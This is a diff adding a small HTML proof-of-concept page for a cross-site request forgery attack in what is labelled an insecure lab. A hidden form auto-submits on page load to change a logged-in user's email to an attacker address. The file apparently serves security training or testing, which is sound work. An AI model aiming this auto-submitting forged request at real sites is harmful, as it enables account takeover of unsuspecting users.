@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>CSRF PoC · INSECURE lab</title>
+  </head>
+  <body>
+    <p>Submitting forged email change… (stay logged in to the dashboard on this host.)</p>
+    <form id="csrf" method="post" action="/api/lab/profile/email">
+      <input type="hidden" name="email" value="attacker-forged@evil.lab" />
+    </form>
+    <script>
+      document.getElementById("csrf").submit();
+    </script>
+  </body>
+</html>
